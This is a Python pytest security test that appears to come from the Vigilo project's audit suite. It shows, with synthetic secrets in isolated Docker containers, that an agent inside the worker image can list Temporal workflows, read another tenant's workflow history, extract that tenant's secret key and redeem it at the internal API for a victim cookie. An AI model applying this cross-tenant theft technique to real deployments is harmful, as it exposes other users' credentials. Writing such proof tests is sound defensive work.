"""Docker-level proof: an agent in the Vigilo worker image can read and redeem
another tenant's synthetic secret from Temporal workflow history.

Requires Docker and the audit image built from the repository's production
Dockerfile (vigilo-worker-audit). No production credentials or services used.
"""
from __future__ import annotations


import asyncio
import json
import shutil
import socket
import subprocess
import uuid

import pytest
from httpx import ASGITransport, AsyncClient
from temporalio.client import Client

from tests.security.vigilo_synthetic_workflow import VigiloSyntheticSecretWorkflow
from src.webapi import secret_store
from src.webapi.db import get_async_session
from src.webapi.internal import create_internal_app
from src.webapi.models import Job, Repository, Run, User, RUN_RUNNING


IMAGE = "vigilo-worker-audit"
TEMPORAL_IMAGE = "temporalio/temporal:1.5.0"


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


async def _new_run(session_maker) -> uuid.UUID:
    async with session_maker() as session:
        user = User(
            id=uuid.uuid4(), email=f"{uuid.uuid4().hex}@example.test",
            hashed_password="not-a-real-password", role="user",
            is_active=True, is_superuser=False, is_verified=True,
        )
        session.add(user)
        await session.flush()
        repo = Repository(created_by=user.id, name="docker-synthetic-repo", source_type="upload")
        session.add(repo)
        await session.flush()
        job = Job(created_by=user.id, repository_id=repo.id, name="docker-synthetic-job",
                  stage_preset="vuln")
        session.add(job)
        await session.flush()
        run = Run(job_id=job.id, status=RUN_RUNNING, session_id=str(uuid.uuid4()),
                  data_dir="/tmp/vigilo-docker-synthetic-test")
        session.add(run)
        await session.commit()
        return run.id


@pytest.mark.asyncio
async def test_real_worker_container_can_redeem_peer_run_secret(session_maker):
    if not shutil.which("docker"):
        pytest.skip("Docker CLI unavailable")
    built = subprocess.run(
        ["docker", "image", "inspect", IMAGE],
        capture_output=True, text=True,
    )
    if built.returncode:
        pytest.skip(f"{IMAGE} must be built from the repository Dockerfile before this test")

    secret_store.reset_rate_limits()
    attacker_run = await _new_run(session_maker)
    victim_run = await _new_run(session_maker)
    async with session_maker() as session:
        attacker_key = await secret_store.issue(
            session, attacker_run, {"cookie_header": "SYNTHETIC_ATTACKER_COOKIE"}
        )
    async with session_maker() as session:
        victim_key = await secret_store.issue(
            session, victim_run, {"cookie_header": "SYNTHETIC_VICTIM_COOKIE_DO_NOT_USE"}
        )

    temporal_name = f"vigilo-temporal-{uuid.uuid4().hex[:8]}"
    network = f"vigilo-audit-{uuid.uuid4().hex[:10]}"
    temporal_port = _free_port()
    docker = ["docker"]
    temporal_started = False
    network_created = False
    client = None
    try:
        subprocess.run(docker + ["network", "create", network], check=True,
                       capture_output=True, text=True)
        network_created = True
        subprocess.run(docker + [
            "run", "-d", "--name", temporal_name, "--network", network,
            "--network-alias", "temporal", "-p", f"127.0.0.1:{temporal_port}:7233",
            TEMPORAL_IMAGE, "server", "start-dev", "--ip", "0.0.0.0",
            "--db-filename", "/home/temporal/temporal.db", "--ip", "0.0.0.0",
        ], check=True, capture_output=True, text=True)
        temporal_started = True

        # Host-side setup client starts two runs on the isolated Temporal server.
        address = f"127.0.0.1:{temporal_port}"
        for _ in range(60):
            try:
                client = await Client.connect(address)
                break
            except Exception:
                await asyncio.sleep(1)
        assert client is not None, "isolated Temporal server did not become ready"

        for run_id, key in ((attacker_run, attacker_key), (victim_run, victim_key)):
            await client.start_workflow(
                VigiloSyntheticSecretWorkflow.run,
                {"run_id": str(run_id), "secrets": {"ref": str(run_id), "key": key}},
                id=str(run_id),
                task_queue="vigilo-docker-agent-proof",
            )

        probe_path = "tests/security/docker_agent_probe.py"
        result = subprocess.run(docker + [
            "run", "--rm", "--network", network,
            "-e", "TEMPORAL_ADDRESS=temporal:7233",
            "-e", "VIGILO_INTERNAL_API_URL=http://api:8081",
            "-v", f"{__import__('os').path.abspath(probe_path)}:/tmp/docker_agent_probe.py:ro",
            "--entrypoint", "python3", IMAGE,
            "/tmp/docker_agent_probe.py", str(victim_run),
        ], capture_output=True, text=True, timeout=90)
        assert result.returncode == 0, (
            f"agent container failed ({result.returncode})\nstdout: {result.stdout}\nstderr: {result.stderr}"
        )
        lines = [line for line in result.stdout.splitlines() if line.startswith("{")]
        assert lines, f"agent container returned no JSON result: {result.stdout}"
        proof = json.loads(lines[-1])
        assert proof["workflow_enumeration"] is True
        assert proof["history_read"] is True
        assert proof["temporal_address_survived_envguard"] is True
        assert proof["internal_api_url_removed_by_envguard"] is True
        assert proof["redeemed_key_from_history"] == victim_key

        # Redeem the key extracted inside the real worker container against
        # Vigilo's actual internal FastAPI endpoint and isolated test database.
        async def override_session():
            async with session_maker() as session:
                yield session

        app = create_internal_app()
        app.dependency_overrides[get_async_session] = override_session
        async with AsyncClient(
            transport=ASGITransport(app=app), base_url="http://internal"
        ) as internal:
            response = await internal.post(
                f"/internal/v1/runs/{victim_run}/secrets",
                json={"key": proof["redeemed_key_from_history"], "want": ["cookie_header"]},
            )
        assert response.status_code == 200, response.text
        assert response.json() == {
            "secrets": {"cookie_header": "SYNTHETIC_VICTIM_COOKIE_DO_NOT_USE"}
        }
    finally:
        if temporal_started:
            subprocess.run(docker + ["rm", "-f", temporal_name], capture_output=True)
        if network_created:
            subprocess.run(docker + ["network", "rm", network], capture_output=True)
